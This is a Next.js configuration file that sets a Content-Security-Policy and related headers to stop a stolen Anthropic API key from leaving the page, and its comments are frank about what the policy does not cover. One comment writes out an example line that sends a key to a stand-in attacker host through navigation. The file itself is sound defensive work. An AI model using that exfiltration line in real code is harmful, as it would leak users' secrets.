import type { NextConfig } from "next";

/**
 * A Content-Security-Policy, written for one threat in particular.
 *
 * The AI assistant takes the visitor's own Anthropic key and keeps it in `sessionStorage` (see
 * `src/lib/byok.ts` for why it is there and not on our server). The honest objection to that — the
 * one a reader raised — is that **any script running in this page can read it**. A compromised
 * dependency is the realistic way that happens; nobody needs to break into the host.
 *
 * So the policy is aimed at the step *after* the theft: getting the key out. `connect-src` names
 * the only three places this app ever talks to, so an injected script cannot `fetch` a stolen key
 * to an attacker's server, and `form-action` stops it being posted through a form.
 *
 * **What it does not do**, stated plainly rather than left for someone to discover:
 *
 * - `script-src` has to keep `'unsafe-inline'`. Next.js hydrates through inline scripts, and the
 *   alternative is a per-request nonce from middleware, which makes every page dynamic and throws
 *   away the static rendering this app's speed rests on. A strict `script-src` is the fix that
 *   would actually stop injection; this is not it, and pretending otherwise would be worse than
 *   having no policy.
 * - CSP cannot stop a top-level navigation (`location = "https://evil.example/?k=" + key`).
 *   `navigate-to` was removed from the spec and never shipped.
 *
 * What is left is a real narrowing of the exits, not a fix for XSS. Both halves are true and the
 * README says so in the same words.
 */
const SUPABASE_ORIGIN = (() => {
  // Only present when someone has attached their own Supabase project; the default deployment has
  // no cloud backend, and then the origin must not be in the policy at all.
  try {
    const url = process.env.NEXT_PUBLIC_SUPABASE_URL?.trim();
    return url ? new URL(url).origin : "";
  } catch {
    return "";
  }
})();

const csp = [
  "default-src 'self'",
  // See the note above: this is the weak line, and it is weak on purpose rather than by oversight.
  "script-src 'self' 'unsafe-inline'",
  // Tailwind ships a stylesheet, but React writes `style` attributes for chart geometry and the
  // crash screen, which is what 'unsafe-inline' covers here.
  "style-src 'self' 'unsafe-inline'",
  // `blob:` for charts rendered through a canvas, `data:` for the images that go into a PDF.
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  // The whole point. `api.anthropic.com` is the BYOK path; the Supabase origin appears only on a
  // deployment that configured one; everything else this app fetches is its own routes.
  ["connect-src 'self' https://api.anthropic.com", SUPABASE_ORIGIN].filter(Boolean).join(" "),
  // Downloads go through a blob: URL, which counts as a navigation.
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  "upgrade-insecure-requests",
].join("; ");

const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          { key: "Content-Security-Policy", value: csp },
          // Not CSP, but the same job: keep what this page knows from leaving through a side door.
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "X-Frame-Options", value: "DENY" },
          // The app needs none of these, and a page that never asks should not be able to.
          { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=()" },
        ],
      },
    ];
  },
};

export default nextConfig;
